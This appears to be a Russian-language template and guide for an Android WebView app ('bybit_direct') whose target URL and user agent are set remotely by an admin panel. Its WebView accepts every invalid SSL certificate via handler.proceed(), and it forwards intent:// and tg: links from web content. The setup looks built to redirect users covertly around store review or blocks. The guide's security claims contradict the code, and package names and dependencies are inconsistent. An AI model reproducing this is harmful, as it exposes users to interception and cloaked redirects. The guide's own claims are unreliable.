# Минимальный Android (Kotlin + Jetpack Compose) для загрузки ссылки и userAgent с админки

---

## Включённые файлы в шаблон

1. `app/src/main/AndroidManifest.xml`
2. `app/build.gradle` (модуль)
3. `build.gradle` (проекта) — примечание
4. `app/src/main/java/com/example/myapp/MainActivity.kt`
5. `app/src/main/res/values/strings.xml`
6. `proguard-rules.pro` (минимум)

---

## Общая идея

1. При старте приложения выполняется HTTP GET к URL админ панели, указанной в `strings.xml`.
2. Ожидаемый ответ админки: строка с разделителем `***`, где первая часть — `useragent`, вторая — `link`.
   Пример отклика:

   ```
   Mozilla/5.0 (Custom UA) *** https://target.example/path
   ```
3. Каждый запуск делает новый запрос с заголовками `Cache-Control`, `Pragma`, `Expires`, чтобы избежать кэширования.
4. Загруженный `link` открывается внутри `WebView` (Compose + AndroidView). Если указан `useragent` — применяется он.
5. Приложение требует только разрешение `INTERNET`.
6. Используются стандартные библиотеки Android / Jetpack Compose.

---

## Файл: AndroidManifest.xml

```xml
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.myapp">

    <uses-permission android:name="android.permission.INTERNET" />

    <application
        android:label="@string/app_name"
        android:icon="@mipmap/ic_launcher"
        android:allowBackup="false">
        <activity android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```

---

## Файл: app/build.gradle.kts

```kotlin
plugins {
   alias(libs.plugins.android.application)
   alias(libs.plugins.kotlin.android)
   alias(libs.plugins.kotlin.compose)
}

android {
   namespace = "com.example.bybit_direct"
   compileSdk = 36

   defaultConfig {
      applicationId = "com.example.bybit_direct"
      minSdk = 24
      targetSdk = 36
      versionCode = 1
      versionName = "1.0"

      testInstrumentationRunner = "androidx.test.runner.AndroidJUnitRunner"
   }

   buildTypes {
      release {
         isMinifyEnabled = false
         proguardFiles(
            getDefaultProguardFile("proguard-android-optimize.txt"),
            "proguard-rules.pro"
         )
      }
   }
   packaging {
      resources {
         excludes += listOf(
            "/META-INF/LICENSE",
            "/META-INF/LICENSE.txt",
            "/META-INF/NOTICE",
            "/META-INF/NOTICE.txt"
         )
      }
   }
   compileOptions {
      sourceCompatibility = JavaVersion.VERSION_11
      targetCompatibility = JavaVersion.VERSION_11
   }
   kotlinOptions {
      jvmTarget = "11"
   }
   buildFeatures {
      compose = true
   }
}

dependencies {

   implementation(libs.androidx.core.ktx)
   implementation(libs.androidx.lifecycle.runtime.ktx)
   implementation(libs.androidx.activity.compose)
   implementation(platform(libs.androidx.compose.bom))
   implementation(libs.androidx.ui)
   implementation(libs.androidx.ui.graphics)
   implementation(libs.androidx.ui.tooling.preview)
   implementation(libs.androidx.material3)
   testImplementation(libs.junit)
   androidTestImplementation(libs.androidx.junit)
   androidTestImplementation(libs.androidx.espresso.core)
   androidTestImplementation(platform(libs.androidx.compose.bom))
   androidTestImplementation(libs.androidx.ui.test.junit4)
   debugImplementation(libs.androidx.ui.tooling)
   debugImplementation(libs.androidx.ui.test.manifest)
}
```

---

## Файл: app/src/main/res/values/strings.xml

```xml
<resources>
    <string name="app_name_admin">bybit-direct</string>
    <string name="admin_url">https://linkapp.tdsdomain.ru/webview-admin/app.php/</string>
</resources>
```

---

## Файл: app/src/main/java/com/example/myapp/MainActivity.kt

```kotlin
package com.example.myapp

import android.annotation.SuppressLint
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.webkit.CookieManager
import android.webkit.WebView
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.annotation.RequiresApi
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.CircularProgressIndicator
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.unit.dp
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
// Основная активити приложения
@SuppressLint("SetJavaScriptEnabled")
class MainActivity : ComponentActivity() {

   private val adminUrl by lazy { getString(R.string.admin_url) }
   private val projectParam by lazy { getString(R.string.app_name_admin) }

   @RequiresApi(Build.VERSION_CODES.O)
   override fun onCreate(savedInstanceState: Bundle?) {
      super.onCreate(savedInstanceState)
      CookieManager.getInstance().setAcceptCookie(true)
      setContent {
         Surface(modifier = Modifier.fillMaxSize()) {
            LauncherScreen(adminUrl, projectParam)
         }
      }
   }
}

@RequiresApi(Build.VERSION_CODES.O)
@SuppressLint("SetJavaScriptEnabled", "ContextCastToActivity")
@Composable
fun LauncherScreen(adminUrl: String, projectParam: String) {
   var hasError by remember { mutableStateOf(false) }
   var loading by remember { mutableStateOf(true) }
   var targetUrl by remember { mutableStateOf<String?>(null) }
   var customUA by remember { mutableStateOf<String?>(null) }
   var errorMsg by remember { mutableStateOf<String?>(null) }
   val context = LocalContext.current
   LaunchedEffect(key1 = adminUrl, key2 = projectParam) {
      loading = true
      errorMsg = null

      val urlWithParams = buildAdminRequestUrl(adminUrl, projectParam)

      try {
         val raw = fetchJsonNoCache(urlWithParams)
         val parts = raw.split("***")
         Log.e("LauncherScreen", "Fetching admin URL: $urlWithParams \n got response: $raw")

         if (parts.size == 2) {
            val ua = parts[0].trim()
            val url = parts[1].trim()

            customUA = ua.ifBlank { null }
            targetUrl = url
         } else {
            errorMsg = "Invalid response format from admin"
         }

      } catch (t: Throwable) {
         errorMsg = "Network error: ${t.message}"
         hasError = true
      } finally {
         loading = false
      }
   }


   when {
      loading -> {
         // Простая загрузка
         Surface(modifier = Modifier.fillMaxSize()) {
            CircularProgressIndicator(modifier = Modifier.fillMaxSize())
         }
      }

      errorMsg != null || hasError -> {
         Surface(modifier = Modifier.fillMaxSize()) {
            Column(
               modifier = Modifier
                  .fillMaxSize()
                  .padding(16.dp),
               horizontalAlignment = Alignment.CenterHorizontally,
               verticalArrangement = Arrangement.Center
            ) {
               Text("Проблемы с интернетом", modifier = Modifier.padding(bottom = 8.dp))
               Text(
                  "Пожалуйста, проверьте интернет соединение или отключите VPN",
                  modifier = Modifier.padding(bottom = 16.dp)
               )
               Text("Попробовать снова")
               Spacer(modifier = Modifier.height(16.dp))
               Text("Подпишитесь на телеграм канал чтобы отслеживать доступность сайта")
            }
         }
      }

      targetUrl != null -> {

         HybridWebView(
            url = targetUrl!!,
            customUA
               ?: "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"
         )

      }

      else -> {
         Surface(modifier = Modifier.fillMaxSize()) {
            Text(text = "No URL to open")
         }
      }
   }
}

fun buildAdminRequestUrl(base: String, projectParam: String): String {
   val encodedProject = URLEncoder.encode(projectParam, "UTF-8")
   val sep = if (base.contains("?")) "&" else "?"
   return "$base${sep}appname=$encodedProject"
}


suspend fun fetchJsonNoCache(urlStr: String): String = withContext(Dispatchers.IO) {
   val url = URL(urlStr)
   val conn = (url.openConnection() as HttpURLConnection).apply {
      connectTimeout = 10_000
      readTimeout = 10_000
      instanceFollowRedirects = true // следовать редиректам при запросе админки
      useCaches = false
      requestMethod = "GET"
      setRequestProperty("Cache-Control", "no-cache, no-store, must-revalidate")
      setRequestProperty("Pragma", "no-cache")
      setRequestProperty("Expires", "0")
      // Можно отправить заголовок с project, но мы уже передали в GET
   }

   try {
      val code = conn.responseCode
      val stream = if (code in 200..299) conn.inputStream else conn.errorStream
      BufferedReader(InputStreamReader(stream, Charsets.UTF_8)).use { br ->
         val sb = StringBuilder()
         var line: String? = br.readLine()
         while (line != null) {
            sb.append(line)
            line = br.readLine()
         }
         sb.toString()
      }
   } finally {
      conn.disconnect()
   }
}
```

---

## Файл: HybridWebView.kt
Компонент WebView с поддержкой пользовательского User-Agent и обработкой ссылок
```kotlin
package com.example.myapp

import android.content.Intent
import android.net.Uri
import android.net.http.SslError
import android.webkit.CookieManager
import android.webkit.SslErrorHandler
import android.webkit.WebResourceRequest
import android.webkit.WebView
import androidx.compose.runtime.Composable
import androidx.compose.runtime.DisposableEffect
import androidx.compose.runtime.remember
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.LifecycleEventObserver
import androidx.lifecycle.compose.LocalLifecycleOwner
import com.google.accompanist.web.AccompanistWebChromeClient
import com.google.accompanist.web.AccompanistWebViewClient
import com.google.accompanist.web.WebView
import com.google.accompanist.web.rememberWebViewNavigator
import com.google.accompanist.web.rememberWebViewState

@Composable
fun HybridWebView(url: String, userAgent: String) {
   val lifecycleOwner = LocalLifecycleOwner.current

   // 2. Добавляем наблюдатель для отслеживания событий жизненного цикла
   DisposableEffect(lifecycleOwner) {
      val observer = LifecycleEventObserver { _, event ->
         when (event) {
            // Когда приложение переходит в фоновый режим (или activity/fragment останавливается)
            Lifecycle.Event.ON_STOP -> {
               // !!! ПРИНУДИТЕЛЬНОЕ СОХРАНЕНИЕ КУКИ НА ДИСК !!!
               CookieManager.getInstance().flush()
               // Начиная с Android 11 (API 30), нужно использовать flush
            }
            else -> {}
         }
      }

      // Регистрируем наблюдателя
      lifecycleOwner.lifecycle.addObserver(observer)

      // Удаляем наблюдателя, когда компонент покидает композицию
      onDispose {
         lifecycleOwner.lifecycle.removeObserver(observer)
      }
   }

   val state = rememberWebViewState(url)
   val navigator = rememberWebViewNavigator()
   // Создаем кастомный WebViewClient для обработки SSL ошибок и специальных ссылок
   val client = remember {
      object : AccompanistWebViewClient() {
         override fun onReceivedSslError(
            view: WebView?,
            handler: SslErrorHandler?,
            error: SslError?
         ) {
            handler?.proceed()
         }

         override fun shouldOverrideUrlLoading(
            view: WebView?,
            request: WebResourceRequest?
         ): Boolean {
            val url = request?.url.toString()
            val context = view?.context ?: return false
            // Обработка специальных схем URL
            if (url.startsWith("tg://") || url.startsWith("tg:") ||
               url.startsWith("intent://") || url.startsWith("mailto:") ||
               url.startsWith("tel:")) {
               try {
                  val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
                  context.startActivity(intent)
               } catch (e: Exception) {
               }
               return true
            }
            // Открытие социальных сетей во внешнем браузере
            if (url.contains("vk.com") || url.contains("ok.ru") ||
               url.contains("facebook.com") || url.contains("instagram.com") ||
               url.contains("twitter.com") || url.contains("youtube.com")) {
               context.startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url)))
               return true
            }

            return false
         }
      }
   }
   WebView(
      state = state,
      navigator = navigator,
      onCreated = { webView ->
         webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            setSupportMultipleWindows(false)
            javaScriptCanOpenWindowsAutomatically = false

            useWideViewPort = true
            loadWithOverviewMode = true
            allowContentAccess = true

            userAgentString = userAgent

            CookieManager.getInstance().setAcceptCookie(true)
            CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true)
         }
      },
      client = client
   )
}

```

## Файл: proguard-rules.pro

```
-keepclassmembers class * {
    @android.webkit.JavascriptInterface <methods>;
}

# стандартные правила
```

---

## Инструкция по сборке и настройке

1. Создать новый проект в Android Studio → Empty Compose Activity.
2. Вставить файлы в соответствующие директории, изменить `package` при необходимости.
3. В `strings.xml` указать ваш `admin_url`.
4. Можно изменить название и иконку приложения.
5. Для релиз-сборки включить `minifyEnabled true` (R8).
6. Админка должна возвращать ответ в формате `useragent *** link`.

---

## Пример ответа админки

```
Mozilla/5.0 (Custom UA) *** https://target.example/path
```

Если `useragent` отсутствует — используется системный WebView user-agent.

---

## Безопасность и права

* Приложение требует только `INTERNET`.
* Нет доступа к камере, файлам, контактам, местоположению.
* Нет сторонних SDK или аналитики.

---

## Уменьшение веса приложения

* Включить `minifyEnabled true` (R8).
* Убрать лишние ресурсы.
* Можно использовать старую версию Compose для уменьшения размера APK.

---
